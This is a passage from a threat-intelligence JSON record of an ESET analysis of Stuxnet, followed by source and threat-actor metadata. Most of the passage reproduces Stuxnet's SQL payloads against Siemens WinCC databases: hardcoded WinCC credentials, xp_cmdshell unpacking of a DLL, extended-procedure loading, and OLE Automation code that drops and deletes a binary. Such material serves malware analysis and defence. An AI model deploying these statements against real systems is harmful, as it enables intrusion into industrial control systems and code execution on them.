addextendedproc(sp_payload,@t);exec\nmaster..sp_payload;exec master..sp_dropextendedproc sp_payload;break; end fetch next from\nr into @t end close r deallocate r --*'\n    exec (@t)\n\n```\n\n-----\n\n**String 3**\n```\nview MCPVPROJECT2 as select PROJECTID,PROJECTNAME,PROJECTVERSION,PROJECTMODE, \n               PROJECTCREATOR,PROJECTEDITOR,CREATIONDATE,EDITDATE,\n               PRJCOMMENT,CSLANGUAGE,RTLANGUAGE,PROJECTGUID,PRJTABLETYPES, \n               PRJDATATYPES,PRJCREATEVERMAJ,PRJCREATEVERMIN, PRJXRES, \n               PRJTIMEMODE,PRJDELTAMODE,PRJDELTAREMOTE \n    from MCPTPROJECT where ((SELECT top 1 1 FROM MCPVREADVARPERCON)='1')\n\n```\n**String 4**\n```\nview MCPVPROJECT2 as select MCPTPROJECT.PROJECTID,\n           MCPTPROJECT.PROJECTNAME, MCPTPROJECT.PROJECTVERSION, \n           MCPTPROJECT.PROJECTMODE, MCPTPROJECT.PROJECTCREATOR, \n           MCPTPROJECT.PROJECTEDITOR, MCPTPROJECT.CREATIONDATE, \n           MCPTPROJECT.EDITDATE, MCPTPROJECT.PRJCOMMENT,\n           MCPTPROJECT.CSLANGUAGE, MCPTPROJECT.RTLANGUAGE, \n           MCPTPROJECT.PROJECTGUID, MCPTPROJECT.PRJTABLETYPES, \n           MCPTPROJECT.PRJDATATYPES, MCPTPROJECT.PRJCREATEVERMAJ, \n           MCPTPROJECT.PRJCREATEVERMIN, MCPTPROJECT.PRJXRES, \n           MCPTPROJECT.PRJTIMEMODE, MCPTPROJECT.PRJDELTAMODE,\n           MCPTPROJECT.PRJDELTAREMOTE  from MCPTPROJECT\n\n```\n**String 5**\n```\nview MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID, FORMATFITTING, SCALEID, \n           VARIABLENAME, ADDRESSPARAMETER, PROTOKOLL,MAXLIMIT, MINLIMIT, \n           STARTVALUE, SUBSTVALUE, VARFLAGS, CONNECTIONID, VARPROPERTY, \n           CYCLETIMEID, LASTCHANGE, ASDATASIZE, OSDATASIZE, VARGROUPID, VARXRES,\n           VARMARK, SCALETYPE, SCALEPARAM1, SCALEPARAM2, \n           SCALEPARAM3, SCALEPARAM4 from MCPTVARIABLEDESC,\n           openrowset('SQLOLEDB','Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder',\n           'select 0;declare @t varchar(999),@s varchar(999),@a int declare r\ncursor for select filename from master..sysdatabases where (name like ''CC%'') open r\nfetch next from r into @t while (@@fetch_status<>-1) begin set @t=left(@t,len(@t)charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';exec master..xp_fileexist @t,@a\nout;if @a=1 begin set @s = ''master..xp_cmdshell ''''extrac32 /y \"''+@t+''\"\n\"''+@t+''x\"'''''';exec(@s);set @t=@t+''x'';dbcc addextendedproc(sp_run,@t);exec\nmaster..sp_run;exec master..sp_dropextendedproc sp_run;break;end fetch next from r into\n@t end close r deallocate r')\n\n```\n**String 6**\n```\nview MCPVREADVARPERCON as select MCPTVARIABLEDESC.VARIABLEID, \n       MCPTVARIABLEDESC.VARIABLETYPEID, MCPTVARIABLEDESC.FORMATFITTING, \n       MCPTVARIABLEDESC.SCALEID, MCPTVARIABLEDESC.VARIABLENAME, \n       CPTVARIABLEDESC.ADDRESSPARAMETER, MCPTVARIABLEDESC.PROTOKOLL, \n       MCPTVARIABLEDESC.MAXLIMIT, MCPTVARIABLEDESC.MINLIMIT, \n       MCPTVARIABLEDESC.STARTVALUE, MCPTVARIABLEDESC.SUBSTVALUE, \n       MCPTVARIABLEDESC.VARFLAGS, MCPTVARIABLEDESC.CONNECTIONID, \n       MCPTVARIABLEDESC.VARPROPERTY, MCPTVARIABLEDESC.CYCLETIMEID, \n       MCPTVARIABLEDESC.LASTCHANGE, MCPTVARIABLEDESC.ASDATASIZE, \n       MCPTVARIABLEDESC.OSDATASIZE, MCPTVARIABLEDESC.VARGROUPID, \n       MCPTVARIABLEDESC.VARXRES, MCPTVARIABLEDESC.VARMARK, \n       MCPTVARIABLEDESC.SCALETYPE, MCPTVARIABLEDESC.SCALEPARAM1, \n       MCPTVARIABLEDESC.SCALEPARAM2, MCPTVARIABLEDESC.SCALEPARAM3, \n       MCPTVARIABLEDESC.SCALEPARAM4 from MCPTVARIABLEDESC\n\n```\n**String 7**\n```\nview MCPVPROJECT2 as select JECTID,PROJECTNAME,PROJECTVERSION,PROJECTMODE,PROJECTCREATOR,\n           PROJECTEDITOR, CREATIONDATE, EDITDATE, PRJCOMMENT, CSLANGUAGE, \n           RTLANGUAGE, PROJECTGUID, PRJTABLETYPES, PRJDATATYPES, \n\n```\n\n-----\n\n```\n           PRJCREATEVERMAJ, PRJCREATEVERMIN, PRJXRES, PRJTIMEMODE, PRJDELTAMODE,\n           PRJDELTAREMOTE \n           from MCPTPROJECT where ((SELECT top 1 1 FROM MCPVREADVARPERCON)='1')\n\n```\n**String 8**\n```\nview MCPVREADVARPERCON as select VARIABLEID, VARIABLETYPEID, FORMATFITTING, SCALEID, \n           VARIABLENAME, ADDRESSPARAMETER, PROTOKOLL, MAXLIMIT, MINLIMIT, \n           STARTVALUE, SUBSTVALUE, VARFLAGS, CONNECTIONID, VARPROPERTY, \n           CYCLETIMEID, LASTCHANGE, ASDATASIZE, OSDATASIZE, VARGROUPID, VARXRES,\n           VARMARK, SCALETYPE, SCALEPARAM1, SCALEPARAM2, SCALEPARAM3, \n           SCALEPARAM4 from MCPTVARIABLEDESC,\n    openrowset('SQLOLEDB','Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder',\n           \"'select 0;use master;declare @t varchar(999),@s varchar(999);select\n@t=filename from master..sysdatabases where (name like ''CC%'');set @t=left(@t,len(@t)charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';set @s = ''master..xp_cmdshell\n''''extrac32 /y \"''+@t+''\" \"''+@t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc\naddextendedproc(sprun,@t);exec master..sprun;exec master..sp_dropextendedproc sprun')\n\n```\n**String 9**\n```\nview MCPVREADVARPERCON as select MCPTVARIABLEDESC.VARIABLEID, \n       MCPTVARIABLEDESC.VARIABLETYPEID, MCPTVARIABLEDESC.FORMATFITTING, \n       MCPTVARIABLEDESC.SCALEID, MCPTVARIABLEDESC.VARIABLENAME, \n       MCPTVARIABLEDESC.ADDRESSPARAMETER, MCPTVARIABLEDESC.PROTOKOLL, \n       MCPTVARIABLEDESC.MAXLIMIT, MCPTVARIABLEDESC.MINLIMIT, \n       MCPTVARIABLEDESC.STARTVALUE, MCPTVARIABLEDESC.SUBSTVALUE, \n       MCPTVARIABLEDESC.VARFLAGS, MCPTVARIABLEDESC.CONNECTIONID, \n       MCPTVARIABLEDESC.VARPROPERTY, MCPTVARIABLEDESC.CYCLETIMEID, \n       MCPTVARIABLEDESC.LASTCHANGE, MCPTVARIABLEDESC.ASDATASIZE, \n       MCPTVARIABLEDESC.OSDATASIZE, MCPTVARIABLEDESC.VARGROUPID, \n       MCPTVARIABLEDESC.VARXRES, MCPTVARIABLEDESC.VARMARK, \n       MCPTVARIABLEDESC.SCALETYPE, MCPTVARIABLEDESC.SCALEPARAM1, \n       MCPTVARIABLEDESC.SCALEPARAM2, MCPTVARIABLEDESC.SCALEPARAM3, \n       MCPTVARIABLEDESC.SCALEPARAM4 from MCPTVARIABLEDESC\n\n```\n**String 10**\n```\nview MCPVPROJECT2 as select MCPTPROJECT.PROJECTID, MCPTPROJECT.PROJECTNAME, \n       MCPTPROJECT.PROJECTVERSION,  MCPTPROJECT.PROJECTMODE, \n       MCPTPROJECT.PROJECTCREATOR, MCPTPROJECT.PROJECTEDITOR,\n       MCPTPROJECT.CREATIONDATE, MCPTPROJECT.EDITDATE, MCPTPROJECT.PRJCOMMENT,\n       MCPTPROJECT.CSLANGUAGE, MCPTPROJECT.RTLANGUAGE, MCPTPROJECT.PROJECTGUID,\n       MCPTPROJECT.PRJTABLETYPES, MCPTPROJECT.PRJDATATYPES, \n       MCPTPROJECT.PRJCREATEVERMAJ, MCPTPROJECT.PRJCREATEVERMIN, \n       MCPTPROJECT.PRJXRES, MCPTPROJECT.PRJTIMEMODE,\n       MCPTPROJECT.PRJDELTAMODE, MCPTPROJECT.PRJDELTAREMOTE \n       from MCPTPROJECT\n\n```\n**String 11**\n```\nview MCPVREADVARPERCON as select VARIABLEID, VARIABLETYPEID, FORMATFITTING,SCALEID, \n       VARIABLENAME, ADDRESSPARAMETER, PROTOKOLL, MAXLIMIT, MINLIMIT, STARTVALUE,\n       SUBSTVALUE, VARFLAGS, CONNECTIONID, VARPROPERTY, CYCLETIMEID, LASTCHANGE, \n       ASDATASIZE, OSDATASIZE, VARGROUPID, VARXRES, VARMARK, SCALETYPE,\n       SCALEPARAM1, SCALEPARAM2, SCALEPARAM3, SCALEPARAM4\n       from MCPTVARIABLEDESC,\n       openrowset('SQLOLEDB','Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder',\n       \"'select 0;use master;declare @t varchar(999),@s varchar(999);select\n@t=filename from master..sysdatabases where (name like ''CC%R'');set @t=left(@t,len(@t)charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';set @s = ''master..xp_cmdshell_\n''''extrac32 /y \"''+@t+''\" \"''+@t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc\naddextendedproc(sp_run,@t);exec master..sp_run;')\n\n```\n\n-----\n\n**String 12**\n```\nview MCPVREADVARPERCON as select MCPTVARIABLEDESC.VARIABLEID, \n       MCPTVARIABLEDESC.VARIABLETYPEID, MCPTVARIABLEDESC.FORMATFITTING, \n       MCPTVARIABLEDESC.SCALEID, MCPTVARIABLEDESC.VARIABLENAME, \n       MCPTVARIABLEDESC.ADDRESSPARAMETER, MCPTVARIABLEDESC.PROTOKOLL, \n       MCPTVARIABLEDESC.MAXLIMIT, MCPTVARIABLEDESC.MINLIMIT, \n       MCPTVARIABLEDESC.STARTVALUE, MCPTVARIABLEDESC.SUBSTVALUE, \n       MCPTVARIABLEDESC.VARFLAGS, MCPTVARIABLEDESC.CONNECTIONID, \n       MCPTVARIABLEDESC.VARPROPERTY, MCPTVARIABLEDESC.CYCLETIMEID, \n       MCPTVARIABLEDESC.LASTCHANGE, MCPTVARIABLEDESC.ASDATASIZE, \n       MCPTVARIABLEDESC.OSDATASIZE, MCPTVARIABLEDESC.VARGROUPID, \n       MCPTVARIABLEDESC.VARXRES, MCPTVARIABLEDESC.VARMARK, \n       MCPTVARIABLEDESC.SCALETYPE, MCPTVARIABLEDESC.SCALEPARAM1, \n       MCPTVARIABLEDESC.SCALEPARAM2, MCPTVARIABLEDESC.SCALEPARAM3, \n       MCPTVARIABLEDESC.SCALEPARAM4 from MCPTVARIABLEDESC\n\n```\n**String 13**\n```\nDECLARE @vr varchar(256)\nSET @vr = CONVERT(varchar(256), (SELECT serverproperty('productversion') ))\nIF @vr > '9'\n    BEGIN\n       EXEC sp_configure 'show advanced options', 1 RECONFIGURE WITH OVERRIDE\n       EXEC sp_configure 'Ole Automation Procedures', 1 RECONFIGURE WITH OVERRIDE\n    END\n\n```\n**String 14**\n```\nDECLARE\n    @ashl int,\n    @aind varchar(260),\n    @ainf varchar(260),\n    @hr int\n    EXEC @hr = sp_OACreate 'WScript.Shell', @ashl OUT\n    IF @hr <> 0\n       GOTO endq\n    EXEC sp_OAMethod @ashl, 'ExpandEnvironmentStrings', @aind OUT, \n                              '%%ALLUSERSPROFILE%%'\n    SET @ainf = @aind + '\\sql%05x.dbi'\n    DECLARE\n       @aods int, \n       @adss int, \n       @aip int, \n       @abf varbinary(4096)\n       EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT\n       IF @hr <> 0 \n       GOTO endq\n       EXEC @hr = sp_OASetProperty @aods, 'Type', 1\n       IF @hr <> 0\n       GOTO endq\n       EXEC @hr = sp_OAMethod @aods, 'Open', null\n       IF @hr <> 0 \n       GOTO endq\n       SET @adss = ( SELECT DATALENGTH(abin) FROM sysbinlog )\n       SET @aip = 1\n\n```\n\n-----\n\n```\n       WHILE ( @aip <= @adss )\n       BEGIN\n       SET @abf = ( SELECT SUBSTRING (abin, @aip, 4096 ) FROM sysbinlog )\n       EXEC @hr = sp_OAMethod @aods, 'Write', null, @abf\n       IF @hr <> 0\n       GOTO endq\n       SET @aip = @aip + 4096\n       END \n       EXEC @hr = sp_OAMethod @aods, 'SaveToFile', null, @ainf, 2 \n       IF @hr <> 0 \n       GOTO endq \n       EXEC sp_OAMethod @aods, 'Close', null\nendq: \n    EXEC sp_dropextendedproc sp_dumpdbilog\n\n```\n**String 15**\n```\nDECLARE\n    @ashl int,\n    @aind varchar(260),\n    @ainf varchar(260),\n    @hr int\n    EXEC @hr = sp_OACreate 'WScript.Shell', @ashl OUT\n    IF @hr <> 0\n       GOTO endq \n    EXEC sp_OAMethod @ashl, 'ExpandEnvironmentStrings', @aind OUT, \n                              '%%ALLUSERSPROFILE%%'\n    SET @ainf = @aind + '\\sql%05x.dbi'\n    EXEC sp_addextendedproc sp_dumpdbilog, @ainf\n    EXEC sp_dumpdbilog\n    EXEC sp_dropextendedproc sp_dumpdbilog\nendq:\n\n```\n**String 16**\n```\nDECLARE\n    @ashl int,\n    @aind varchar(260),\n    @ainf varchar(260),\n    @hr int\n    EXEC @hr = sp_OACreate 'WScript.Shell', @ashl OUT\n    IF @hr <> 0\n       GOTO endq\n    EXEC sp_OAMethod @ashl, 'ExpandEnvironmentStrings', @aind OUT, \n                                  '%%ALLUSERSPROFILE%%'\n    SET @ainf = @aind + '\\sql%05x.dbi'\n    DECLARE @fs int\n    EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @fs OUT\n    IF @hr <> 0\n       GOTO endq\n    EXECUTE sp_OAMethod @fs, 'DeleteFile', NULL, @ainf\nendq: \n\n```\n\n-----\n\n**String 17**\n```\nDROP TABLE sysbinlog\n\n```\n**String 18**\n```\nCREATE TABLE sysbinlog ( abin image ) INSERT INTO sysbinlog VALUES(0x\n\n```\n**String 19**\n```\n0;set IMPLICIT_TRANSACTIONS off;declare @z nvarchar(999);set @z=''use [?];declare @t\nnvarchar(2000);declare @s nvarchar(9);set @s=''''--CC-S''''+char(80);if\nleft(db_name(),2)=''''CC'''' select\n@t=substring(text,charindex(@s,text)+8,charindex(''''--*'''',text)-charindex(@s,text)-8)\nfrom syscomments where text like (''''%''''+@s+''''%'''');if @t is not NULL\nexec(@t)'';exec sp_msforeachdb @z')\n\n```\n**String 20**\n```\n((SELECT top 1 1 FROM MCPVREADVARPERCON)='1') --CC-SP\n\n```\n**String 21**\n```\nuse master\n\n```\n**String 22**\n```\nselect name from master..sysdatabases where filename like N'%s'\n\n```\n**String 23**\n```\nexec master..sp_attach_db 'wincc_svr', N'%s', N'%s'\n\n```\n**String 24**\n```\nexec master..sp_detach_db 'wincc_svr'\n\n```\n**String 25**\n```\nuse wincc_svr\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://www.esetnod32.ru/company/viruslab/analytics/doc/Stuxnet_Under_the_Microscope.pdf",
        "https://papers.vx-underground.org/papers/ICS SCADA/Stuxnet/Stuxnet Under the Microscope v1.1.pdf"
    ],
    "report_names": [
        "Stuxnet_Under_the_Microscope.pdf",
        "Stuxnet Under the Microscope v1.1.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1287169050,
    "ts_modification_date": 1287169050,
    "files": {
        "pdf": "https://archive.orkl.eu/65a945f04db630840a0454ca6aa9f6e60fdbaf3c.pdf",
        "text": "https://archive.orkl.eu/65a945f04db630840a0454ca6aa9f6e60fdbaf3c.txt",
        "img": "https://archive.orkl.eu/65a945f04db630840a0454ca6aa9f6e60fdbaf3c.jpg"
    }
}